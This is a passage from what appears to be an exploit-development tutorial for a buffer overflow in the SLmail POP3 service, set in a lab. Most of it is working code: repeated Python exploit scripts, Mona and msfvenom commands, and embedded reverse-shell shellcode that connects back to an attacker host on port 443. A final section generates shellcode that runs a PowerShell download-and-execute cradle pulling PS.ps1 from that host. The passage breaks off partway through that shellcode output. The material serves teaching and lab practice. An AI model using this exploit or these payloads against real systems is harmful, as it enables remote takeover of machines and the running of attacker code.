    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)

    s.send(b"USER loki" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':
    exploit()
```

Now, since **slmail** has been corrupted, we must restart it, as well as the **immunity debugger**. Then we re-attach the *SLmail* process and hit *play*.

Let's try launching the above script to see what hexadecimal string we get in the *EIP*:

```bash
python3 exploit.py
```

The resulting *EIP* is *7A46317A*.

If we pass this value to the *pattern_offset* tool it will tell us the exact *offset* it has:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x7A46317A

# Output
4654
```

Let's modify the exploit.py script again. This time we know the exact offset before the *EIP*, *4654*, and we also know that the *EIP* contains *4 bytes*. That said, if we put *4* '*B*' after the specified *offset* we should be able to modify the *EIP* to the value *42424242* (*BBBB* [in hexadecimal](https://www.garykessler.net/library/ascii.html)):

```python
#!/usr/bin/python3

import socket

# Global variables
ip_address = "192.168.50.167"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4

payload = before_eip + eip

def exploit():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)

    s.send(b"USER loki" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':
    exploit()
```

We must restart **slmail** and **immunity debugger** and proceed with the execution of the script:

```bash
python3 exploit.py
```

As we can see, we have succeeded in making the *EIP* value *42424242*.

At this point we already have *control of the EIP*, since as an attacker we can show the *address we want* in the *EIP*.

## Shellcode space allocation

Once the *offset* has been found and the value of the *EIP* register has been overwritten in a buffer overflow, the next step is to identify where in memory the characters entered in the input field are being represented.

After overwriting the value of the *EIP* register, any additional characters that we introduce in the input field, we will see from *Immunity Debugger* that in this particular case they will be represented at the beginning of the *stack* in the *ESP* (*Extended Stack Pointer*) register. The *ESP* (Extended Stack Pointer) is a CPU register that is used to manage the stack in a program. The stack is a temporary memory area that is used to store values and *return addresses* of functions as they are called in the program.

Once the location of the characters in memory has been identified, the main idea at this point is to insert a *shellcode* in that location, which are low-level instructions which in this case will correspond to a malicious instruction.

The shellcode is inserted on the stack and placed at the same memory address where the overwritten characters were placed. In other words, the buffer overflow is exploited to execute the malicious shellcode and take control of the system.

It is important to note that the shellcode must be carefully designed to avoid being detected as a malicious program, and must be compatible with the CPU architecture and operating system being attacked.

In short, allocating space for the shellcode involves identifying the location in memory where the overwritten characters were placed in the buffer overflow and placing the malicious shellcode there. However, not all characters in the shellcode can be interpreted. In the section we will see how to detect these *badchars* and how to generate a shellcode that does not have these characters.

----

To assign the corresponding space for the Shellcode we will modify the script once more:

```python
#!/usr/bin/python3

import socket

# Global variables
ip_address = "192.168.50.167"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4
after_eip = b"C"*200

payload = before_eip + eip + after_eip

def exploit():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)

    s.send(b"USER loki" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':
    exploit()
```

## Generation of Bytearrays and detection of Badchars

In the generation of our malicious shellcode for buffer overflow exploitation, some characters may not be interpreted correctly by the target program. These characters are known as "*badchars*" and can cause the shellcode to crash or the target program to close unexpectedly.

To avoid this, it is important to identify and remove badchars from the shellcode. We will see how from Immunity Debugger we will be able to take advantage of the *Mona* functionality to generate different bytearrays with almost all characters represented, and then identify the characters that the target program fails to interpret.

Once the badchars are identified, they can be discarded from the final shellcode and generate a new shellcode that does not contain these characters. To identify the badchars, different techniques can be used, such as the introduction of different bytearrays with consecutive hexadecimal characters, which make it possible to identify the characters that the target program fails to interpret.

These characters will be represented in the stack (*ESP*), where we will see which characters are not being represented, thus identifying the badchars.

----

First we will use the following command to create our working directory with the *Mona* utility:

```bash
!mona config -set workingfolder C:\Users\Loki\Desktop\Analysis
```

Then we are going to generate a combination of all possible characters and we are going to move the *bytearray.txt* that we have generated to our machine. To do this we must create with *impacket-smbserver* a network resource called *smbFolder* that is synchronized with the current working directory and we will give support for version 2 of smb because sometimes *Windows* requires it:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

To access the resource from *Windows*, we must open the *file explorer* and go to the following path:

```bash
# This is our attacker IP
\\192.168.50.172\smbFolder
```

Now we are going to modify again the *exploit.py* script, adding in the payload all the hexadecimal values of the *bytearray.txt* file:

```python
#!/usr/bin/python3

import socket

# Global variables
ip_address = "192.168.50.167"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4

# ESP
after_eip = (b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_eip + eip + after_eip

def exploit():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)

    s.send(b"USER loki" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':
    exploit()
```

When we execute the script and the application has crashed, we will go to *Immunity Debugger* and select the *ESP* in the registry, we will right click and select the option *follow in dump*, which will take us to the *registry* corresponding to the payload that we have introduced (after the *EIP*).

Now the task that we have is to see which characters are *invalid* for the application, for it we can see the missing characters in the *hex dump* or we can use the following command of *Mona* to see the next value that fails:

```bash
# Here we are comparing the value of the ESP and compare it with the generated bytearray.bin file, then it will give us the failing character
!mona compare -a 0xDIRECCIONDELESP -f C:\Users\Loki\Desktop\Analysis\bytearray.bin

# Output
0x00
```

In this case we see that the character that fails is *00*, so we must exclude it from the list. To do this we are going to generate a new list *excluding* that *character*:

```bash
!mona bytearray -cpb '\x00'
```

If we modify our script again with these last values and check again with *Mona* the invalid characters, we will see that now the one that fails is *0a*, so we must *exclude* it too:

```bash
!mona bytearray -cpb '\x00\x0a'
```

We must do this constantly until *Mona* indicates that there is no more *BadChar*.

These are the final characters to be excluded in this case:

```bash
!mona bytearray -cpb '\x00\x0a\x0d'
```

And this is how the script will look like with all the *valid characters*:

```python
#!/usr/bin/python3

import socket

# Global variables
ip_address = "192.168.50.167"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = b"B"*4

# ESP
after_eip = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

payload = before_eip + eip + after_eip

def exploit():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)

    s.send(b"USER loki" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':
    exploit()
```

Now we can generate a *shellcode* that we are interested in without those characters that the program does not like.

## OpCodes search to enter the ESP and load our Shellcode

Once the malicious *shellcode* has been generated and the badchars have been detected, the next step is to make the program flow into the shellcode so that it can be interpreted. The idea is to make the EIP register point to a memory address where an *opcode* is applied that makes a jump to the *ESP* register (*JMP ESP*), which is where the shellcode is located. This is because we cannot make the EIP point directly to our shellcode in the first place.

To find the *JMP ESP* opcode, you can use different tools, such as *mona.py*, which allows you to search for opcodes in specific modules in the target program's memory. Once the '*JMP ESP*' opcode has been found, the value of the EIP register can be overwritten with the memory address where the opcode is located, which will allow jumping to the ESP register and executing the malicious shellcode.

Opcode lookup to enter the ESP register and load the shellcode is a technique used to make the program flow into the shellcode to be interpreted. The JMP ESP opcode is used to jump to the memory address of the ESP register, where the shellcode is located.

----

To generate the *shellcode* we can do it with the **msfvenom** tool:

```bash
# EXITFUNC=thread is so that if the service crashes, we don't lose the shell since we have it in another thread
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.50.172 LPORT=443 -b '\x00\x0a\x0d' -f c EXITFUNC=thread

# If it does not detect the default shikata_ga_nai encoder, we can specify it with '-e'
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=192.168.50.172 LPORT=443 -b '\x00\x0a\x0d' -f c -e x86/shikata_ga_nai EXITFUNC=thread

# Output
"\xbb\xba\x25\x76\x42\xdb\xc0\xd9\x74\x24\xf4\x5a\x29\xc9"
"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xe0\x2b\x94\xb7\xe8"
"\xdc\xda\x38\x10\x1d\xbb\xb1\xf5\x2c\xfb\xa6\x7e\x1e\xcb"
"\xad\xd2\x93\xa0\xe0\xc6\x20\xc4\x2c\xe9\x81\x63\x0b\xc4"
"\x12\xdf\x6f\x47\x91\x22\xbc\xa7\xa8\xec\xb1\xa6\xed\x11"
"\x3b\xfa\xa6\x5e\xee\xea\xc3\x2b\x33\x81\x98\xba\x33\x76"
"\x68\xbc\x12\x29\xe2\xe7\xb4\xc8\x27\x9c\xfc\xd2\x24\x99"
"\xb7\x69\x9e\x55\x46\xbb\xee\x96\xe5\x82\xde\x64\xf7\xc3"
"\xd9\x96\x82\x3d\x1a\x2a\x95\xfa\x60\xf0\x10\x18\xc2\x73"
"\x82\xc4\xf2\x50\x55\x8f\xf9\x1d\x11\xd7\x1d\xa3\xf6\x6c"
"\x19\x28\xf9\xa2\xab\x6a\xde\x66\xf7\x29\x7f\x3f\x5d\x9f"
"\x80\x5f\x3e\x40\x25\x14\xd3\x95\x54\x77\xbc\x5a\x55\x87"
"\x3c\xf5\xee\xf4\x0e\x5a\x45\x92\x22\x13\x43\x65\x44\x0e"
"\x33\xf9\xbb\xb1\x44\xd0\x7f\xe5\x14\x4a\xa9\x86\xfe\x8a"
"\x56\x53\x50\xda\xf8\x0c\x11\x8a\xb8\xfc\xf9\xc0\x36\x22"
"\x19\xeb\x9c\x4b\xb0\x16\x77\xb4\xed\x2a\x2b\x5c\xec\x4a"
"\x32\x26\x79\xac\x5e\x48\x2c\x67\xf7\xf1\x75\xf3\x66\xfd"
"\xa3\x7e\xa8\x75\x40\x7f\x67\x7e\x2d\x93\x10\x8e\x78\xc9"
"\xb7\x91\x56\x65\x5b\x03\x3d\x75\x12\x38\xea\x22\x73\x8e"
"\xe3\xa6\x69\xa9\x5d\xd4\x73\x2f\xa5\x5c\xa8\x8c\x28\x5d"
"\x3d\xa8\x0e\x4d\xfb\x31\x0b\x39\x53\x64\xc5\x97\x15\xde"
"\xa7\x41\xcc\x8d\x61\x05\x89\xfd\xb1\x53\x96\x2b\x44\xbb"
"\x27\x82\x11\xc4\x88\x42\x96\xbd\xf4\xf2\x59\x14\xbd\x13"
"\xb8\xbc\xc8\xbb\x65\x55\x71\xa6\x95\x80\xb6\xdf\x15\x20"
"\x47\x24\x05\x41\x42\x60\x81\xba\x3e\xf9\x64\xbc\xed\xfa"
"\xac"
```

----
> Sometimes if there are many badchars the *shikata_ga_nai* encoder will not be able to generate the *shellcode*, to solve this we should not indicate any encoder and let *msfvenom* handle it.
----

Now we must modify the *exploit.py* script to include our *shellcode*, adding the above output.

Before that, we also have to keep in mind that the *EIP* currently *points to 42424242* (*BBBB*), but we have to try to *point it to the stack* because that is where our *shellcode* will be hosted. Since we can't tell the *EIP* where to point, we have to try to find an *opcode* that performs the jump to the *ESP* (*JMP ESP*). For this we are going to use *Mona*:

```bash
!mona modules
```

We have to find a *module* that is running that has all the *protections disabled* (*False*). One of these modules would be, for example, *SLMFC.DLL*. For this we first have to know which is the *opcode* corresponding to *JMP ESP*, for this we can use the *nasm_shell* tool:

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

# If we enter 'JMP ESP' the output will be 'FFE4', which translates to '\xFF\xE4'.
```

Now we can use *Mona* to search for the *JMP ESP* opcode and the *SLMFC.DLL* module we obtained earlier:

```bash
!mona find -s "\xFF\xE4" -m SLMFC.DLL
```

We have to take any *address* that does *not contain the badchars* that we have detected before and we copy it with right click. In this case I have taken the *0x5f4a358f*.

The *address* that we obtained previously will be the *EIP* to which we will point in our *exploit.py*, but being a *32-bit system* we must represent it in *little endian*:

```python
#!/usr/bin/python3

import socket
from struct import pack

# Global variables
ip_address = "192.168.50.167"
port = 110
offset = 4654

before_eip = b"A"*offset
# We must make sure that the address is in lower case
eip = pack("<L", 0x5f4a358f)
shell_code = (b"\xbb\xba\x25\x76\x42\xdb\xc0\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xe0\x2b\x94\xb7\xe8"
b"\xdc\xda\x38\x10\x1d\xbb\xb1\xf5\x2c\xfb\xa6\x7e\x1e\xcb"
b"\xad\xd2\x93\xa0\xe0\xc6\x20\xc4\x2c\xe9\x81\x63\x0b\xc4"
b"\x12\xdf\x6f\x47\x91\x22\xbc\xa7\xa8\xec\xb1\xa6\xed\x11"
b"\x3b\xfa\xa6\x5e\xee\xea\xc3\x2b\x33\x81\x98\xba\x33\x76"
b"\x68\xbc\x12\x29\xe2\xe7\xb4\xc8\x27\x9c\xfc\xd2\x24\x99"
b"\xb7\x69\x9e\x55\x46\xbb\xee\x96\xe5\x82\xde\x64\xf7\xc3"
b"\xd9\x96\x82\x3d\x1a\x2a\x95\xfa\x60\xf0\x10\x18\xc2\x73"
b"\x82\xc4\xf2\x50\x55\x8f\xf9\x1d\x11\xd7\x1d\xa3\xf6\x6c"
b"\x19\x28\xf9\xa2\xab\x6a\xde\x66\xf7\x29\x7f\x3f\x5d\x9f"
b"\x80\x5f\x3e\x40\x25\x14\xd3\x95\x54\x77\xbc\x5a\x55\x87"
b"\x3c\xf5\xee\xf4\x0e\x5a\x45\x92\x22\x13\x43\x65\x44\x0e"
b"\x33\xf9\xbb\xb1\x44\xd0\x7f\xe5\x14\x4a\xa9\x86\xfe\x8a"
b"\x56\x53\x50\xda\xf8\x0c\x11\x8a\xb8\xfc\xf9\xc0\x36\x22"
b"\x19\xeb\x9c\x4b\xb0\x16\x77\xb4\xed\x2a\x2b\x5c\xec\x4a"
b"\x32\x26\x79\xac\x5e\x48\x2c\x67\xf7\xf1\x75\xf3\x66\xfd"
b"\xa3\x7e\xa8\x75\x40\x7f\x67\x7e\x2d\x93\x10\x8e\x78\xc9"
b"\xb7\x91\x56\x65\x5b\x03\x3d\x75\x12\x38\xea\x22\x73\x8e"
b"\xe3\xa6\x69\xa9\x5d\xd4\x73\x2f\xa5\x5c\xa8\x8c\x28\x5d"
b"\x3d\xa8\x0e\x4d\xfb\x31\x0b\x39\x53\x64\xc5\x97\x15\xde"
b"\xa7\x41\xcc\x8d\x61\x05\x89\xfd\xb1\x53\x96\x2b\x44\xbb"
b"\x27\x82\x11\xc4\x88\x42\x96\xbd\xf4\xf2\x59\x14\xbd\x13"
b"\xb8\xbc\xc8\xbb\x65\x55\x71\xa6\x95\x80\xb6\xdf\x15\x20"
b"\x47\x24\x05\x41\x42\x60\x81\xba\x3e\xf9\x64\xbc\xed\xfa"
b"\xac")

payload = before_eip + eip + shell_code

def exploit():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)

    s.send(b"USER loki" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':
    exploit()
```

To check if the *address* we have entered in the *EIP* contains the *JMP ESP* instruction, we can hit play and *debug* the code. To do this we can click on the arrow to the right that when hovering over it shows us "*Go to address*" and look for the previous address until we see that it includes *JMP ESP*.

Now we can make right click and put a *breakpoint* so that the code stops when it passes there.

When we execute the script, if everything has gone well, in the point where the breakpoint is the value of the *EIP should point to the address that we put before*, which means that the *following thing* that is going to be executed is the *JMP ESP*.

If we click on "*Step into*" we can see that the *ESP* value is now the same as the *EIP*, this is because *EIP* is going to point to the *ESP* in the next step.

Right now the *shellcode* will not be interpreted, we have to give it a *space*. We will see this in the next section.

## Use of NOPs, stack offsets and Shellcode interpretation to achieve RCE

Once the address of the opcode that applies the jump to the *ESP* register has been found, the shellcode may not be interpreted correctly because its execution may require more time than the processor has available before proceeding to the next instruction in the program.

To solve this problem, techniques such as inserting *NOPS* (*no operation instructions*) before the shellcode on the stack are often used. *NOPS* do not perform any operation, but allow the processor additional time to interpret the shellcode before continuing with the next instruction in the program.

Another technique often used is stack shifting, which involves modifying the ESP register to reserve additional space for the shellcode and allow it to run smoothly. For example, the instruction "*sub esp, 0x10*" can be used to move the *ESP* register *16 bytes* down the stack to reserve additional space for the shellcode.

----

To use *NOPs* we can include, for example, *32 bytes* in the payload *between the EIP and our shellcode*:

```python
#!/usr/bin/python3

import socket
from struct import pack

# Global variables
ip_address = "192.168.50.167"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4a358f)
shell_code = (b"\xbb\xba\x25\x76\x42\xdb\xc0\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xe0\x2b\x94\xb7\xe8"
b"\xdc\xda\x38\x10\x1d\xbb\xb1\xf5\x2c\xfb\xa6\x7e\x1e\xcb"
b"\xad\xd2\x93\xa0\xe0\xc6\x20\xc4\x2c\xe9\x81\x63\x0b\xc4"
b"\x12\xdf\x6f\x47\x91\x22\xbc\xa7\xa8\xec\xb1\xa6\xed\x11"
b"\x3b\xfa\xa6\x5e\xee\xea\xc3\x2b\x33\x81\x98\xba\x33\x76"
b"\x68\xbc\x12\x29\xe2\xe7\xb4\xc8\x27\x9c\xfc\xd2\x24\x99"
b"\xb7\x69\x9e\x55\x46\xbb\xee\x96\xe5\x82\xde\x64\xf7\xc3"
b"\xd9\x96\x82\x3d\x1a\x2a\x95\xfa\x60\xf0\x10\x18\xc2\x73"
b"\x82\xc4\xf2\x50\x55\x8f\xf9\x1d\x11\xd7\x1d\xa3\xf6\x6c"
b"\x19\x28\xf9\xa2\xab\x6a\xde\x66\xf7\x29\x7f\x3f\x5d\x9f"
b"\x80\x5f\x3e\x40\x25\x14\xd3\x95\x54\x77\xbc\x5a\x55\x87"
b"\x3c\xf5\xee\xf4\x0e\x5a\x45\x92\x22\x13\x43\x65\x44\x0e"
b"\x33\xf9\xbb\xb1\x44\xd0\x7f\xe5\x14\x4a\xa9\x86\xfe\x8a"
b"\x56\x53\x50\xda\xf8\x0c\x11\x8a\xb8\xfc\xf9\xc0\x36\x22"
b"\x19\xeb\x9c\x4b\xb0\x16\x77\xb4\xed\x2a\x2b\x5c\xec\x4a"
b"\x32\x26\x79\xac\x5e\x48\x2c\x67\xf7\xf1\x75\xf3\x66\xfd"
b"\xa3\x7e\xa8\x75\x40\x7f\x67\x7e\x2d\x93\x10\x8e\x78\xc9"
b"\xb7\x91\x56\x65\x5b\x03\x3d\x75\x12\x38\xea\x22\x73\x8e"
b"\xe3\xa6\x69\xa9\x5d\xd4\x73\x2f\xa5\x5c\xa8\x8c\x28\x5d"
b"\x3d\xa8\x0e\x4d\xfb\x31\x0b\x39\x53\x64\xc5\x97\x15\xde"
b"\xa7\x41\xcc\x8d\x61\x05\x89\xfd\xb1\x53\x96\x2b\x44\xbb"
b"\x27\x82\x11\xc4\x88\x42\x96\xbd\xf4\xf2\x59\x14\xbd\x13"
b"\xb8\xbc\xc8\xbb\x65\x55\x71\xa6\x95\x80\xb6\xdf\x15\x20"
b"\x47\x24\x05\x41\x42\x60\x81\xba\x3e\xf9\x64\xbc\xed\xfa"
b"\xac")

payload = before_eip + eip + b"\x90"*32 + shell_code

def exploit():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)

    s.send(b"USER loki" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':
    exploit()
```

Now we can open port *443* to listen, as we had specified with **msfvenom**, using **netcat** and the *rlwrap* utility to be able to do things in *Windows* like *CTRL+L* and be more comfortable:

```bash
rlwrap nc -nlvp 443
```

Executing *exploit.py* will give us a *reverse shell*.

If we do not want to apply *NOPs*, we can also apply a *stack offset* with *nasm_shell*. With this instruction we will move the *ESP* register *32 bytes down the stack* and *reserve additional space for the shellcode*:

```bash
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb

# If we enter 'SUB ESP,0x20' the output will be '83EC20', which translates to '\x83\xEC\x20'.
```

We reflect it in the script, and when we execute it we will obtain the *reverse shell*:

```python
#!/usr/bin/python3

import socket
from struct import pack

# Global variables
ip_address = "192.168.50.167"
port = 110
offset = 4654

before_eip = b"A"*offset
eip = pack("<L", 0x5f4a358f)
shell_code = (b"\xbb\xba\x25\x76\x42\xdb\xc0\xd9\x74\x24\xf4\x5a\x29\xc9"
b"\xb1\x52\x83\xc2\x04\x31\x5a\x0e\x03\xe0\x2b\x94\xb7\xe8"
b"\xdc\xda\x38\x10\x1d\xbb\xb1\xf5\x2c\xfb\xa6\x7e\x1e\xcb"
b"\xad\xd2\x93\xa0\xe0\xc6\x20\xc4\x2c\xe9\x81\x63\x0b\xc4"
b"\x12\xdf\x6f\x47\x91\x22\xbc\xa7\xa8\xec\xb1\xa6\xed\x11"
b"\x3b\xfa\xa6\x5e\xee\xea\xc3\x2b\x33\x81\x98\xba\x33\x76"
b"\x68\xbc\x12\x29\xe2\xe7\xb4\xc8\x27\x9c\xfc\xd2\x24\x99"
b"\xb7\x69\x9e\x55\x46\xbb\xee\x96\xe5\x82\xde\x64\xf7\xc3"
b"\xd9\x96\x82\x3d\x1a\x2a\x95\xfa\x60\xf0\x10\x18\xc2\x73"
b"\x82\xc4\xf2\x50\x55\x8f\xf9\x1d\x11\xd7\x1d\xa3\xf6\x6c"
b"\x19\x28\xf9\xa2\xab\x6a\xde\x66\xf7\x29\x7f\x3f\x5d\x9f"
b"\x80\x5f\x3e\x40\x25\x14\xd3\x95\x54\x77\xbc\x5a\x55\x87"
b"\x3c\xf5\xee\xf4\x0e\x5a\x45\x92\x22\x13\x43\x65\x44\x0e"
b"\x33\xf9\xbb\xb1\x44\xd0\x7f\xe5\x14\x4a\xa9\x86\xfe\x8a"
b"\x56\x53\x50\xda\xf8\x0c\x11\x8a\xb8\xfc\xf9\xc0\x36\x22"
b"\x19\xeb\x9c\x4b\xb0\x16\x77\xb4\xed\x2a\x2b\x5c\xec\x4a"
b"\x32\x26\x79\xac\x5e\x48\x2c\x67\xf7\xf1\x75\xf3\x66\xfd"
b"\xa3\x7e\xa8\x75\x40\x7f\x67\x7e\x2d\x93\x10\x8e\x78\xc9"
b"\xb7\x91\x56\x65\x5b\x03\x3d\x75\x12\x38\xea\x22\x73\x8e"
b"\xe3\xa6\x69\xa9\x5d\xd4\x73\x2f\xa5\x5c\xa8\x8c\x28\x5d"
b"\x3d\xa8\x0e\x4d\xfb\x31\x0b\x39\x53\x64\xc5\x97\x15\xde"
b"\xa7\x41\xcc\x8d\x61\x05\x89\xfd\xb1\x53\x96\x2b\x44\xbb"
b"\x27\x82\x11\xc4\x88\x42\x96\xbd\xf4\xf2\x59\x14\xbd\x13"
b"\xb8\xbc\xc8\xbb\x65\x55\x71\xa6\x95\x80\xb6\xdf\x15\x20"
b"\x47\x24\x05\x41\x42\x60\x81\xba\x3e\xf9\x64\xbc\xed\xfa"
b"\xac")

payload = before_eip + eip + b"\x83\xEC\x20" + shell_code

def exploit():
    # Create a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Connect to the server
    s.connect((ip_address, port))

    # Receive the banner
    banner = s.recv(1024)

    s.send(b"USER loki" + b'\r\n')
    response = s.recv(1024)

    s.send(b"PASS " + payload + b'\r\n')
    s.close()

if __name__ == '__main__':
    exploit()
```

## Modification of the Shellcode to control the command to be executed

In addition to the above payloads, it is also possible to use payloads such as "*windows/exec*" to directly load the command to be executed in the *CMD* variable of the payload. This allows you to create a new shellcode that, once interpreted, will directly execute the desired instruction.

The "*windows/exec*" payload is a Metasploit payload that allows you to execute an arbitrary command on the target machine. This payload requires the command to be executed to be specified through the CMD variable in the payload. When generating the shellcode with msfvenom, the parameter "-p windows/exec CMD=<command>" can be used to specify the command to be executed.

Once the shellcode is generated with the desired command, the buffer overflow technique can be used to overwrite the EIP register and cause the program flow to enter the shellcode. When the shellcode is interpreted, the command specified in the CMD variable will be executed directly.

----

We are going to generate a new shellcode with **msfvenom**, but this time we will use the *payload* *windows/exec*, which will allow us to pass the parameter we want in the *CMD* variable:

```bash
# We delete the port and IP because we are going to specify it to download the PS.ps1 file from our HTTP server
msfvenom -p windows/exec CMD="powershell IEX(New-Object Net.WebClient).downloadString('http://192.168.50.172/PS.ps1')" --platform windows -a x86 -b '\x00\x0a\x0d' -f c EXITFUNC=thread

# Output
"\xd9\xc5\xd9\x74\x24\xf4\x5d\xbe\x22\x9f\xd1\xb8\x29\xc9"
"\xb1\x45\x31\x75\x17\x83\xed\xfc\x03\x57\x8c\x33\x4d\x6b"
"\x5a\x31\xae\x93\x9b\x56\x26\x76\xaa\x56\x5c\xf3\x9d\x66"
"\x16\x51\x12\x0c\x7a\x41\xa1\x60\x53\x66\x02\xce\x85\x49"
"\x93\x63\xf5\xc8\x17\x7e\x2a\x2a\x29\xb1\x3f\x2b\x6e\xac"
"\xb2\x79\x27\xba\x61\x6d\x4c\xf6\xb9\x06\x1e\x16\xba\xfb"
"\xd7\x19\xeb\xaa\x6c\x40\x2b\x4d\xa0\xf8\x62\x55\xa5\xc5"
"\x3d\xee\x1d\xb1\xbf\x26\x6c\x3a\x13\x07\x40\xc9\x6d\x40"
"\x67\x32\x18\xb8\x9b\xcf\x1b\x7f\xe1\x0b\xa9\x9b\x41\xdf"
"\x09\x47\x73\x0c\xcf\x0c\x7f\xf9\x9b\x4a\x9c\xfc\x48\xe1"
"\x98\x75\x6f\x25\x29\xcd\x54\xe1\x71\x95\xf5\xb0\xdf\x78"
"\x09\xa2\xbf\x25\xaf\xa9\x52\x31\xc2\xf0\x38\xc4\x50\x8f"
